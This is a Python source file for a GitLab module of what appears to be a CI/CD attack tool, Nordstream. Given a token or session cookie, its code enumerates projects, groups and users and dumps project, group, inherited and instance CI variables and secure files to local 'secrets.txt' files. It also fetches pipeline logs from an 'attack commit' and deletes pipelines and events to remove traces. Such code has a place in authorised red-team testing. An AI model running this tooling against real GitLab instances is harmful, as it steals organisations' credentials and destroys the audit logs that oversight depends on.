import requests
import time
import re
from os import makedirs
from nordstream.utils.log import logger
from nordstream.utils.errors import GitLabError
from nordstream.git import Git
from nordstream.utils.constants import *
from nordstream.utils.helpers import isGitLabSessionCookie

# painfull warnings you know what you are doing right ?
requests.packages.urllib3.disable_warnings()


class GitLab:
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _auth = None
    _session = None
    _token = None
    _projects = []
    _groups = []
    _outputDir = OUTPUT_DIR
    _headers = {
        "User-Agent": USER_AGENT,
    }
    _cookies = {}
    _gitlabURL = None
    _branchName = _DEFAULT_BRANCH_NAME
    _sleepTime = 15
    _maxRetry = 10

    def __init__(self, url, token, verifCert):
        self._gitlabURL = url.strip("/")
        self._token = token
        self._session = requests.Session()
        self._session.verify = verifCert
        self.setCookiesAndHeaders()
        self._gitlabLogin = self.__getLogin()

    @property
    def projects(self):
        return self._projects

    @property
    def groups(self):
        return self._groups

    @property
    def token(self):
        return self._token

    @property
    def url(self):
        return self._gitlabURL

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @classmethod
    def checkToken(cls, token, gitlabURL, verifyCert):
        logger.verbose(f"Checking token: {token}")
        # from https://docs.gitlab.com/ee/api/rest/index.html#personalprojectgroup-access-tokens
        try:
            cookies = {}
            headers = {"User-Agent": USER_AGENT}

            if isGitLabSessionCookie(token):
                cookies["_gitlab_session"] = token
            else:
                headers["PRIVATE-TOKEN"] = token

            return (
                requests.get(
                    f"{gitlabURL.strip('/')}/api/v4/user",
                    headers=headers,
                    cookies=cookies,
                    verify=verifyCert,
                ).status_code
                == 200
            )
        except Exception as e:
            logger.error(e)
        return False

    def __getLogin(self):
        response = self.getUser()
        return response.get("username", "")

    def getUser(self):
        logger.debug(f"Retrieving user informations")

        return self._session.get(f"{self._gitlabURL}/api/v4/user").json()

    def setCookiesAndHeaders(self):
        if isGitLabSessionCookie(self._token):
            self._session.cookies.update({"_gitlab_session": self._token})
        else:
            self._session.headers.update({"PRIVATE-TOKEN": self._token})

    def __paginatedGet(self, url, params={}):

        params["per_page"] = 100

        res = []

        i = 1
        while True:

            params["page"] = i

            response = self._session.get(url, params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break
                res.extend(response.json())
                i += 1

            else:
                logger.debug(f"Error {response.status_code} while retrieving data: {url}")
                return response.status_code, response.json()

        return response.status_code, res

    def listVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                secret = {"key": variable["key"], "value": variable["value"], "protected": variable["protected"]}

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listInheritedVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        graphQL = {
            "operationName": "getInheritedCiVariables",
            "variables": {"first": 100, "fullPath": project.get("path_with_namespace")},
            "query": """
                query getInheritedCiVariables($after: String, $first: Int, $fullPath: ID!) {
                    project(fullPath: $fullPath) {
                        inheritedCiVariables(after: $after, first: $first) {
                            nodes {
                                key
                                groupName
                                masked
                                hidden
                                protected
                                raw
                            }
                        }
                    }
                }
            """,
        }

        response = self._session.post(f"{self._gitlabURL}/api/graphql", json=graphQL)

        if response.status_code == 200 and len(response.text) > 0:
            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            nodes = response.json().get("data", {}).get("project", {}).get("inheritedCiVariables", {}).get("nodes", [])
            for variable in nodes:

                secret = {
                    "key": variable["key"],
                    "value": variable["raw"],
                    "group": variable["groupName"],
                    "protected": variable["protected"],
                }

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()

        elif response.status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listSecureFilesFromProject(self, project):
        logger.debug("Getting project secure files")
        id = project.get("id")

        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/secure_files")
        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))
            date = time.strftime("%Y-%m-%d_%H-%M-%S")

            for secFile in response:

                date = time.strftime("%Y-%m-%d_%H-%M-%S")
                name = "".join(
                    [c for c in secFile.get("name") if c.isalpha() or c.isdigit() or c in (" ", ".", "-", "_")]
                ).strip()
                fileName = f"securefile_{date}_{name}"

                f = open(f"{path}/{fileName}", "wb")

                content = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{id}/secure_files/{secFile.get('id')}/download"
                )

                # handle large files
                for chunk in content.iter_content(chunk_size=8192):
                    f.write(chunk)
                f.close()

                res.append({"name": secFile.get("name"), "path": f"{path}/{fileName}"})

        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromGroup(self, group):
        id = group.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(group.get("full_path"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                secret = {"key": variable["key"], "value": variable["value"], "protected": variable["protected"]}

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromInstance(self):
        res = []
        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/admin/ci/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir("")

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                secret = {"key": variable["key"], "value": variable["value"], "protected": variable["protected"]}

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def addProject(self, project=None, filterWrite=False, strict=False, membership=False):
        logger.debug(f"Checking project: {project}")

        params = {}

        if membership:
            params["membership"] = True

        if project != None:
            params["search_namespaces"] = True
            params["search"] = project

        if filterWrite:
            params["min_access_level"] = 30

        if not (project and project.isnumeric()):
            status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects", params)
        else:
            response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{project}")
            status_code = response.status_code
            response = [response.json()]

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                if strict and p.get("path_with_namespace") != project:
                    continue
                p = {
                    "id": p.get("id"),
                    "path_with_namespace": p.get("path_with_namespace"),
                    "name": p.get("name"),
                    "path": p.get("path"),
                }
                self._projects.append(p)

        else:
            logger.error("Error while retrieving projects")
            logger.debug(response)

    def addGroups(self, group=None):
        logger.debug(f"Checking group: {group}")

        params = {"all_available": True}

        if group != None:
            params["search_namespaces"] = True
            params["search"] = group

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups", params)

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                p = {
                    "id": p.get("id"),
                    "full_path": p.get("full_path"),
                    "name": p.get("name"),
                }
                self._groups.append(p)

        else:
            logger.error("Error while retrieving groups")
            logger.debug(response)

    def listUsers(self):
        logger.debug(f"Listing users.")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/users")

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                u = {
                    "id": p.get("id"),
                    "username": p.get("username"),
                    "email": p.get("email"),
                    "is_admin": p.get("is_admin"),
                }
                res.append(u)

        else:
            logger.error("Error while retrieving groups")
            logger.debug(response)
        return res

    def __createOutputDir(self, name):
        # outputName = name.replace("/", "_")
        path = f"{self._outputDir}/{name}"
        makedirs(path, exist_ok=True)
        return path

    def waitPipeline(self, projectId):
        logger.info("Getting pipeline output")

        time.sleep(5)

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        ).json()

        if response[0].get("status") not in COMPLETED_STATES:
            for i in range(self._maxRetry):
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
                ).json()

                if response[0].get("status") in COMPLETED_STATES:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: pipeline still not finished.")

        return (
            response[0].get("id"),
            response[0].get("status"),
        )

    def __getJobs(self, projectId, pipelineId):

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}/jobs"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # reverse the list to get the first job at the first position
        return response[::-1]

    def downloadPipelineOutput(self, project, pipelineId):
        projectPath = project.get("path_with_namespace")
        self.__createOutputDir(projectPath)

        projectId = project.get("id")

        jobs = self.__getJobs(projectId, pipelineId)

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        f = open(f"{self._outputDir}/{projectPath}/pipeline_{date}.log", "w")

        if len(jobs) == 0:
            return None

        for job in jobs:

            jobId = job.get("id")
            jobName = job.get("name", "")
            jobStage = job.get("stage", "")
            jobStatus = job.get("status", "")

            output = self.__getTraceForJobId(projectId, jobId)

            if jobStatus != "skipped":
                f.write(f"[+] {jobName} (stage={jobStage})\n")
                f.write(output)

        f.close()

        return f"pipeline_{date}.log"

    def __getTraceForJobId(self, projectId, jobId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")

        if response.status_code != 200:
            for i in range(self._maxRetry):
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")
                if response.status_code == 200:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Output still no ready, error !")
                    return None

        return response.text

    def __deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        )

        headers = {}

        # Get CSRF token when using session cookie otherwise we can't delete a pipeline
        if isGitLabSessionCookie(self._token):

            html_content = self._session.get(f"{self._gitlabURL}/").text
            pattern = r'<meta name="csrf-token" content="([^"]+)"'
            match = re.search(pattern, html_content)
            csrf_token = match.group(1)

            headers["x-csrf-token"] = csrf_token

        for pipeline in response:

            # additional checks for non default branches
            # we don't want to remove legitimate logs
            if self._branchName != self._DEFAULT_BRANCH_NAME:
                commitId = pipeline.get("sha")

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/commits/{commitId}"
                ).json()

                if response.get("title") not in [Git.ATTACK_COMMIT_MSG, Git.CLEAN_COMMIT_MSG]:
                    continue

                if response.get("author_name") != Git.USER:
                    continue

            pipelineId = pipeline.get("id")
            graphQL = {
                "operationName": "deletePipeline",
                "variables": {"id": f"gid://gitlab/Ci::Pipeline/{pipelineId}"},
                "query": "mutation deletePipeline($id: CiPipelineID!) {\n  pipelineDestroy(input: {id: $id}) {\n    errors\n    __typename\n  }\n}\n",
            }

            response = self._session.post(f"{self._gitlabURL}/api/graphql", json=graphQL, headers=headers)

    def cleanAllLogs(self, projectId):
        # deleting the pipeline removes everything
        self.__deletePipeline(projectId)

    # not working
    def __cleanEvents(self, projectId):
        logger.debug(f"Deleting events for project: {projectId}")

        i = 1
        while True:

            params = {"per_page": 100, "page": i}

            response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/events", params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for event in response.json():
                    eventId = event.get("id")
                    # don't work
                    response = self._session.delete(f"{self._gitlabURL}/api/v4/projects/{projectId}/events/{eventId}")

                i += 1
            else:
                logger.error("Error while retrieving event")
                logger.debug(response.json())

    def getBranchesProtectionRules(self, projectId):
        logger.debug("Getting branch protection rules")

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{projectId}/protected_branches")

        if status_code == 403:
            raise GitLabError(response.get("message"))

        return response

    def getBranches(self, projectId):
        logger.debug("Getting branch protection rules (limited)")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/branches"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # sometimes GitLab return a 404 and not an empty array
        if status_code == 404:
            project = self.getProject(projectId)

            # if the repo is empty raise an error since there is no branch
            if project.get("empty_repo"):
                raise GitLabError("The project is empty and has no branches.")
            else:
                raise GitLabError("Got 404 for unknown reason.")

        return response

    def getProject(self, projectId):
        logger.debug("Getting project: {projectId}")

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}")

        if response.status_code != 200:
            raise GitLabError(response.json().get("message"))
        else:
            return response.json()

    def getFailureReasonPipeline(self, projectId, pipelineId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}").json()

        return response.get("yaml_errors", None)

    def getFailureReasonJobs(self, projectId, pipelineId):

        res = []
        jobs = self.__getJobs(projectId, pipelineId)

        for job in jobs:

            failure = {}
            failure["name"] = job.get("name", "")
            failure["stage"] = job.get("stage", "")
            failure["failure_reason"] = job.get("failure_reason", "")

            if failure["failure_reason"] != "":
                res.append(failure)

        return res
